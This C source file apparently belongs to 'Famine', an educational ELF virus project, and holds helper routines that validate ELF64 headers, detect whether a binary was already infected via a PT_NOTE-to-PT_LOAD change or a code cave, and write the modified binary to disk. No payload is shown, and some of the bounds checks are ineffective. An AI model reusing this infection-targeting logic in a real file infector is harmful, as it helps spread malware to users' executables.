# include "../includes/famine.h"

uint32_t ft_swap_32(uint32_t n)
{
	n = ((n << 8) & 0xFF00FF00) | ((n >> 8) & 0xFF00FF);
	return ((n << 16) | (n >> 16));
}

uint64_t ft_swap_64(uint64_t n)
{
	n = ((n << 8) & 0xFF00FF00FF00FF00) | ((n >> 8) & 0x00FF00FF00FF00FF);
	n = ((n << 16) & 0xFFFF0000FFFF0000) | ((n >> 16) & 0x0000FFFF0000FFFF);
	return ((n << 32) | (n >> 32));
}

uint32_t cpu_32(uint32_t n, uint8_t cpu)
{
	if (cpu != 0)
		return (ft_swap_32(n));
	return (n);
}

uint64_t cpu_64(uint64_t n, uint8_t cpu)
{
	if (cpu != 0)
		return (ft_swap_64(n));
	return (n);
}

void debug_dump(t_env *env, unsigned int *content, unsigned int start_addr, size_t size)
{
	printf("\nDEBUG: size = %ld bytes", size);
	for (size_t j = 0; j * 4 < size; j += 1)
	{
		if (j % 4 == 0)
			printf("\n %04lx - ", start_addr + j * 4);
		printf("%08x ", cpu_32(content[j], env->cpu));
	}
	printf("\n");
}

int dump_obj(t_env *env)
{
	int fd;

	if ((fd = open(env->obj_name, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
	{
		if (DEBUG) printf("Error creating '%s' file.\n", env->obj_name);
		return (-1);
	}
	write(fd, env->obj_cpy, env->new_obj_size);
	close(fd);
	return (0);
}

int check_corruption(void *obj, size_t size, char *obj_name) {

	if (((char*)obj)[0] != 0x7f || \
		((char*)obj)[1] != 'E' || \
		((char*)obj)[2] != 'L' || \
		((char*)obj)[3] != 'F' || \
		((char*)obj)[4] != ELFCLASS64)
	{
		if (DEBUG) printf("%s is not an ELF64. Exiting...\n", obj_name);
		return -1;
	}
	// get obj header
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)obj;
	// get pheader number
	int phnum = ehdr->e_phnum;
	// get first p_header
	Elf64_Phdr *phdr = (Elf64_Phdr *)(obj + ehdr->e_phoff);
	if (ehdr->e_type > 3)
	{
		if (DEBUG) printf("Corrupted e_type %d in %s. Exiting...\n", ehdr->e_type, obj_name);
		return -1;
	}
	if (ehdr->e_ehsize >= 65535 || ehdr->e_ehsize <= 0)
	{
		if (DEBUG) printf("Corrupted ehsize %d in %s. Exiting...\n", ehdr->e_ehsize, obj_name);
		return -1;
	}
	if (ehdr->e_phoff != ehdr->e_ehsize)
	{
		if (DEBUG) printf("Corrupted e_phoff %ld in %s. Exiting...\n", ehdr->e_phoff, obj_name);
		return -1;
	}
	if (phnum >= 65535 || phnum <= 0)
	{
		if (DEBUG) printf("Corrupted phnum %d in %s. Exiting...\n", ehdr->e_phnum, obj_name);
		return -1;
	}
	if (ehdr->e_phentsize >= 65535 || ehdr->e_phentsize <= 0)
	{
		if (DEBUG) printf("Corrupted phentsize %d in %s. Exiting...\n", ehdr->e_phentsize, obj_name);
		return -1;
	}
	if (ehdr->e_shentsize >= 65535 || ehdr->e_shentsize <= 0)
	{
		if (DEBUG) printf("Corrupted shentsize %d in %s. Exiting...\n", ehdr->e_shentsize, obj_name);
		return -1;
	}
	if (ehdr->e_shstrndx >= 65535 || ehdr->e_shstrndx <= 0)
	{
		if (DEBUG) printf("Corrupted shstrndx %d in %s. Exiting...\n", ehdr->e_shstrndx, obj_name);
		return -1;
	}
	
	// get sections number
	int shnum = ehdr->e_shnum;
	// get first section header
	Elf64_Shdr *shdr = (Elf64_Shdr *)(obj + ehdr->e_shoff);

	if (shnum >= 65535 || shnum <= 0)
	{
		if (DEBUG) printf("Corrupted shnum %d in %s. Exiting...\n", ehdr->e_shnum, obj_name);
		return -1;
	}
	
	// get str table
	Elf64_Shdr *sh_strtab = &shdr[ehdr->e_shstrndx];
	if (sh_strtab->sh_offset >= size || sh_strtab->sh_offset <= 0)
	{
		if (DEBUG) printf("Corrupted shstrtab_offset %ld in %s. Exiting...\n", sh_strtab->sh_offset, obj_name);
		return -1;
	}
	const char *sh_strtab_p = obj + sh_strtab->sh_offset;
	int prev_type = 0;
	int load_found = 0;
	unsigned int obj_base = 0;
	for (int i = 0; i < phnum; ++i)
	{
		if (prev_type == PT_DYNAMIC && phdr[i].p_type == PT_LOAD)
		{
			if (DEBUG) printf("It is likely that %s have already been infected with PT_LOAD following a PT_NOTE. \nExiting...\n", obj_name);
			return -1;
		}
		if (phdr[i].p_type == 0)
		{
			if (DEBUG) printf("Corrupted p_type %d in %s. Exiting...\n", phdr[i].p_type, obj_name);
			return -1;
		}
		// get base address
		if (load_found == 0 && phdr[i].p_type == PT_LOAD)
		{
			obj_base = phdr[i].p_vaddr;
			load_found = 1;
		}
		if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & 5) == 5 && i + 1 < phnum)
		{
			if (phdr[i].p_filesz >= 0xffffffffffffffff || (int)phdr[i].p_filesz <= 0)
			{
				if (DEBUG) printf("Corrupted p_filesz %ld in %s. Exiting...\n", phdr[i].p_filesz, obj_name);
				return -1;
			}
			if (phdr[i].p_memsz >= 0xffffffffffffffff || (int)phdr[i].p_memsz <= 0)
			{
				if (DEBUG) printf("Corrupted p_memsz %ld in %s. Exiting...\n", phdr[i].p_memsz, obj_name);
				return -1;
			}
			if (phdr[i].p_offset >= 0xffffffffffffffff)
			{
				if (DEBUG) printf("Corrupted p_offset %ld in %s. Exiting...\n", phdr[i].p_offset, obj_name);
				return -1;
			}
			if (phdr[i].p_paddr >= 0xffffffffffffffff)
			{
				if (DEBUG) printf("Corrupted p_paddr %ld in %s. Exiting...\n", phdr[i].p_paddr, obj_name);
				return -1;
			}
			if (phdr[i].p_vaddr >= 0xffffffffffffffff)
			{
				if (DEBUG) printf("Corrupted p_vaddr %ld in %s. Exiting...\n", phdr[i].p_vaddr, obj_name);
				return -1;
			}
		}
		prev_type = phdr[i].p_type;
	}

	for (int i = 0; i < shnum; ++i)
	{
		char c = -1;
		int ic = -1;
		while (c) {
			ic++;
			c = sh_strtab_p[shdr[i].sh_name + ic];
		}
		if (i > 0 && ic == 0) {
			printf("Corrupted sh_name %d in %s. Exiting...\n", shdr[i].sh_name, obj_name);
			return -1;
		}
		if ((int)shdr[i].sh_name < 0 || sh_strtab->sh_offset + shdr[i].sh_name > size)
		{
			if (DEBUG) printf("Corrupted sh_name %d in %s. Exiting...\n", shdr[i].sh_name, obj_name);
			return -1;
		}
		if (strcmp(sh_strtab_p + shdr[i].sh_name, ".fini") == 0 && ehdr->e_entry - obj_base > shdr[i].sh_offset)
		{
			if (DEBUG) printf("It is likely that %s have already been infected in PT_LOAD code cave. \nExiting...\n", obj_name);
			return -1;
		}
		if (strcmp(sh_strtab_p + shdr[i].sh_name, ".text") == 0)
		{
			if (shdr[i].sh_addr >= 0xffffffffffffffff || shdr[i].sh_addr <= 0)
			{
				if (DEBUG) printf("Corrupted sh_addr %ld in %s. Exiting...\n", shdr[i].sh_addr, obj_name);
				return -1;
			}
			if (shdr[i].sh_offset >= 0xffffffffffffffff || shdr[i].sh_offset <= 0)
			{
				if (DEBUG) printf("Corrupted sh_offset %ld in %s. Exiting...\n", shdr[i].sh_offset, obj_name);
				return -1;
			}
			if (shdr[i].sh_size >= 0xffffffffffffffff || shdr[i].sh_size <= 0)
			{
				if (DEBUG) printf("Corrupted sh_size %ld in %s. Exiting...\n", shdr[i].sh_size, obj_name);
				return -1;
			}
		}
	}
	return 0;
}